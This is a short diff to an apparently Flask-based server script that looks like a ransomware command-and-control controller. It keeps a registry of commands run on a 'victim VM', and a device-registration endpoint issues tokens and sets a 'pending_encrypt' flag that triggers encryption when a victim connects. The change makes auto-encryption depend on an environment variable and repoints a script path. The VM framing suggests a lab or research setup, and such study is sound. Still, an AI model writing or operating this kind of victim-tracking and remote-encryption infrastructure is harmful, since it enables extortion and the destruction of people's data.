@@ -43,8 +43,8 @@ DEVICES = {}
 # Simple scripts registry (commands run on the victim VM). Edit via APIs below.
 SCRIPTS = {
     'scriptA': {
-        'label': 'Script A (agent_sync)',
-        'command': 'python C:\\Users\\user\\py_sample\\py_simple\\agent_sync.py'
+        'label': 'Script A (agent_sync from Downloads)',
+        'command': 'python "C:\\Users\\user\\Downloads\\sample\\py_simple\\agent_sync.py"'
     },
     'scriptB': {
         'label': 'Script B (c sample)',
@@ -498,10 +498,11 @@ def publickey_register():
         data = request.get_json(silent=True) or {}
         provided_hostname = data.get('hostname')
 
-        # Create a device token and mark encryption to be triggered on WS auth
+        # Create a device token; by default do NOT trigger encryption on auth
         import secrets
         token = secrets.token_hex(16)
-        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': True, 'ip': requester_ip, 'hostname': provided_hostname }
+        auto = (os.getenv('AUTO_ENCRYPT_ON_AUTH') or '0').strip().lower() in ('1','true','yes','on')
+        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': bool(auto), 'ip': requester_ip, 'hostname': provided_hostname }
 
         record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
         try:
